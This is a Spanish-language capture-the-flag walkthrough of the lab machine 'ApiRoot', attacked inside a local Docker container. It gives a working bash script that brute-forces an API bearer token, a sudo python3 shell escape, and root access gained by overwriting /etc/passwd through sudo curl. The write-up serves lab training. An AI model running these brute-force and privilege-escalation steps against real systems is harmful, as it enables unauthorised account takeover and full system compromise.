
# 15. Máquina: ApiRoot  

<a href="https://github.com/GutsNet"><img title="Author" src="https://img.shields.io/badge/Author-GutsNet-purple.svg?style=for-the-badge&logo=github"></a>

**Dificultad:** *🟡* *Medio*

**Autor:** *[El Pingüino de Mario](https://www.youtube.com/channel/UCGLfzfKRUsV6BzkrF1kJGsg)*

**Fecha de creación:** *15/02/2025*

**Proceso:**
- [1. Despliegue](#desplegando-la-máquina-vulnerable)
- [2. Escaneo de puertos](#escaneo-de-puertos-con-nmap)
- [3. Página principal](#visualización-de-la-página-principal)
- [4. Enumeración de directorios](#enumeración-de-directorios-con-gobuster)
- [5. Fuerza bruta](#fuerza-bruta)
- [6. Escalada de privilegios](#escalada-de-privilegios)

---

## Desplegando la Máquina Vulnerable

```python
~/ApiRooot ᐅ sudo bash auto_deploy.sh apiroot.tar
```
Este comando ejecuta un script de bash (`auto_deploy.sh`) que despliega la máquina vulnerable a partir del archivo `apiroot.tar`.

**Salida:**

```python
Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

#### Verificación de Conectividad

```python
~/ApiRoot ᐅ ping -c 2 172.17.0.2
```
El comando `ping -c 2` envía 2 paquetes ICMP a la dirección IP `172.17.0.2` para verificar la conectividad y la respuesta del host.

**Salida:**

```python
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.100 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.177 ms

--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1025ms
rtt min/avg/max/mdev = 0.100/0.138/0.177/0.038 ms
```

---

## Escaneo de Puertos con Nmap

```python
~/ApiRoot ᐅ nmap -p- -sCV 172.17.0.2
```
Este comando revela que el puertos `22` (SSH) está abierto. También que el puert0 `5000` esta corriendo un servicio upnp (similar al wen http).

**Salida:**

```python
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey: 
|   256 19:f1:08:79:13:c4:42:b8:6c:c8:a3:3e:f5:39:a3:59 (ECDSA)
|_  256 9b:93:02:4e:d2:08:f7:d7:eb:90:48:e4:48:17:1b:f5 (ED25519)
5000/tcp open  upnp
```

**Explicación de parámetros:**

- `-p-`: Escanea todos los puertos (del 1 al 65535).
- `-sCV`: Realiza un escaneo con detección de versión (`-sV`) y utiliza scripts básicos (`-sC`) para obtener más información del servicio.

---

## Visualización de la página principal

- **http://172.17.0.2:5000/**

  Como se puede observar, la página de inicio es una página para el uso de una API

  ![image](https://github.com/user-attachments/assets/2eb61544-3169-4cf0-9f85-b5f5a0f5fa17)

---

## Enumeración de Directorios con Gobuster

```python
~/ApiRoot ᐅ gobuster dir --no-error -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://172.17.0.2:5000
```

**Salida:**

```python
...
/console              (Status: 400) [Size: 167]
...
```
**Explicación de parámetros:**

- `dir`: Modo de enumeración de directorios.
- `-w`: Especifica la wordlist a utilizar.
- `-u`: URL objetivo a escanear.
- `-t 200`: Define el número de hilos a usar (200 en este caso).
- `--no-error`: Oculta los errores emitidos por Gobuster.

#### **http://172.17.0.2:5000/console**

Como se puede observar nos arroja una BadRequest, y probando con otros métodos se obtiene el mismo resultado

![image](https://github.com/user-attachments/assets/5f23ace2-62d4-4c66-aeaf-56a0a3417fd9)

### **Uso de la API**

La página principal nos proporciona los ejemplos de uso de la API, la dirección `http://localhost:5000/api/directorio_oculto` es la más tentadora. Con `wfuzz` realizaremos un escaneo para averiguar si exixte un directorio oculto en la ruta `/api` del sitio
```python
~/ApiRoot ᐅ wfuzz -c --hc=404 -z file,/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u "http://172.17.0.2:5000/api/FUZZ"
```

**Salida:**

```python
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000000202:   401        3 L      5 W        31 Ch       "users" 
```
**Explicación de parámetros:**

- `-c`: Salida con color.
- `--hc`: Oculta en código de estado (404 en este caso).
- `-z`: Payload a utilizar acomañado de la wordlist.
- `-u`: Objetivo del ataque.

Suponiendo que `/users` es el directorio oculto, podemos utilizar el comando proporcionado en la guía de la API. Y como podemos ver, se puede acceder, pero sin autorización.
```python
~/ApiRoot ᐅ curl -H "Authorization: Bearer password_secreta" http://172.17.0.2:5000/api/users
```

**Salida:**

```python
{
  "error": "No autorizado"
}
```

---  

## Fuerza bruta 

Ahora que sabemos cual es el directorio oculto y un posible usuario, intentaremos hacer fuerza bruta con el comando `cURL` apoyandonos de un script de `bash`. El cual monstrará un mesnsaje exitoso si la contraseña es correcta. 
```bash
#!/bin/bash

URL="http://172.17.0.2:5000/api/users"
WORDLIST="/usr/share/seclists/Passwords/rockyou.txt"

while read -r token; do
    echo "Trying token: $token"
    
    response=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $token" "$URL")
    
    if [ "$response" -eq 200 ]; then
        echo "Success! Valid token found: $token"
        exit 0
    fi
done < "$WORDLIST"

echo "No valid token found."
exit 1
```
Si se ejecuta el script, se obtiene el siguiente resultado, en el que vemos las credenciales del usuario Bearer.
```python
Trying token: 123456
Trying token: 12345
Trying token: 123456789
Trying token: password
Trying token: iloveyou
Trying token: princess
Trying token: 1234567
Trying token: rockyou
Trying token: 12345678
Trying token: abc123
Trying token: nicole
Trying token: daniel
Trying token: babygirl
Trying token: monkey
Trying token: lovely
Trying token: jessica
Trying token: 654321
Trying token: michael
Trying token: ashley
Trying token: qwerty
Trying token: 111111
Trying token: iloveu
Trying token: 000000
Trying token: michelle
Trying token: tigger
Trying token: sunshine
Trying token: chocolate
Trying token: password1
Success! Valid token found: password1
```
Ahora si ejecutamos el mismo comando con el token obtenido, podemos ver que tenemos dos posibles usuarios para acceder por SSH.
```python
~/ApiRoot ᐅ curl -H "Authorization: Bearer password1" http://172.17.0.2:5000/api/users
```
**Salida:**

```python
[
  {
    "id": 1,
    "nombre": "bob"
  },
  {
    "id": 2,
    "nombre": "dylan"
  }
]
```

## Escalada de privilegios.

Si probamos a acceder con el usuario `bob` y la contraseña encontrada anteriormente. Vemos que accedemos con éxito a la máquina.

Dentro de la máquina buscamos formas de escalar privilegios, y encontramos que podemos realizar la ejecución de `python3` como el usuario `balulero`.
```python
Matching Defaults entries for bob on 7f87cca6ee8d:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User bob may run the following commands on 7f87cca6ee8d:
    (balulero) NOPASSWD: /usr/bin/python3
```
Si ejecutamos el siguente como el usuario `balulero`, obtenemos un avance. 

```python
sudo -u balulero python3 -c 'import os; os.system("/bin/sh")'
```

Una vez dentro podemos darle un mejor aspecto a la shell con `script /dev/null -c bash`. Como siguiente paso, realizamos el mismo proceso de buscar cómo escalar privilegios. Y como se puede observar, se puede hacer uso de `cURL` como si fueramos `root`
```python
Matching Defaults entries for balulero on 7f87cca6ee8d:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User balulero may run the following commands on 7f87cca6ee8d:
    (ALL) NOPASSWD: /usr/bin/curl
```

### **Acceso a root**
En la ruta `/tmp`, copiaremos el contenido del archivo `/etc/passwd` a un archivo con el mismo nombre. Realizaremos una modificación al contenido para eliminar la contraseña del root. El archvio `/tmp/passwd` quedará de la siguiente forma: 

```python
root::0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
balulero:x:1000:1000:balulero,,,:/home/balulero:/bin/bash
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:102::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
bob:x:1001:1001:bob,,,:/home/bob:/bin/bash
```

La línea `root::0:0:root:/root:/bin/bash` en el archivo `/tmp/passwd` y describe la cuenta del usuario root en un sistema Unix/Linux.
- `root` Nombre de usuario.
- `::` Campo de contraseña vacío, lo que significa que no hay contraseña para el usuario root. Esto es un riesgo de seguridad, ya que cualquiera puede acceder a la cuenta sin autenticación.
- `0:0` UID y GID del usuario root.
- `/root` Directorio home del root.
- `/bin/bash` Shell por defecto.

Finalmente, ejecutando el comando curl como sudo, podemos cambiar el contenido de `/etc/passwd` para elminar la contraseña del root.
```python
sudo curl file:///tmp/passwd -o /etc/passwd
```
La siguiente salida nos indica que se realizó de forma exitosa.
```python
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1187  100  1187    0     0  10.8M      0 --:--:-- --:--:-- --:--:-- 10.8M
```

Finalmente, si ejecutamos el comando `su`, por sí solo nos permitirá acceder al root.

**Comprobación:**
```python
balulero@7f87cca6ee8d:/tmp$ su
root@7f87cca6ee8d:/tmp# whoami
root  
```


